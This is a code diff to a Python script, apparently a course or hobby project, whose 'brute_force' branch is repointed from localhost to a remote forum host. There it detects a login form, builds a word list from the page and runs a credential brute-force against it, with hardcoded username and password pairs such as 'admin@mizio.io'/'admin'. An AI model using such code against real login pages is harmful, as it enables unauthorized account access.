@@ -155,15 +155,15 @@ if __name__ == "__main__":
             request.close()
 
     elif test == "brute_force":
-        host = "localhost"
-        port = 5000
-        url = "/login"
-        ua = "googlebot"
+        # host = "localhost"
+        # port = 5000
+        # url = "/login"
+        # ua = "googlebot"
 
-        # host = "forum.3.17.9.125.xip.io"
-        # port = 80
-        # url = "/login/"
-        # ua = "chrome"
+        host = "forum.3.17.9.125.xip.io"
+        port = 80
+        url = "/login/"
+        ua = "chrome"
 
         request = HttpRequest(host, port, "GET")
         request.connect()
@@ -171,7 +171,6 @@ if __name__ == "__main__":
         if sent_get:
             response = request.receive()
             body = request.get_body(response)
-            print(body)
 
             # Detect if login form is present and get the login fields
             login = detect_login(body,host+url)
@@ -179,12 +178,11 @@ if __name__ == "__main__":
                 print(login)
                 form_url, user_key, pass_key, action_val = login
 
-                words = tokenize_html(body)
-                # if "yalofaputu@autowb.com" in words and "test" in words:
-                #     words = {"yalofaputu@autowb.com","test"}
-                # post_req = HttpRequest(host, port, "POST")
-                if "admin@mizio.io" in words:
-                    words = {"admin@mizio.io","admin"}
+                words = tokenize_html(response, False)
+                if "yalofaputu@autowb.com" in words and "test" in words:
+                    words = {"yalofaputu@autowb.com","test"}
+                # if "admin@mizio.io" in words:
+                #     words = {"admin@mizio.io","admin"}
                 post_req = HttpRequest(host, port, "POST")
                 success = bruteforce(post_req, form_url, host, port, ua, user_key, pass_key, action_val, words)
                 
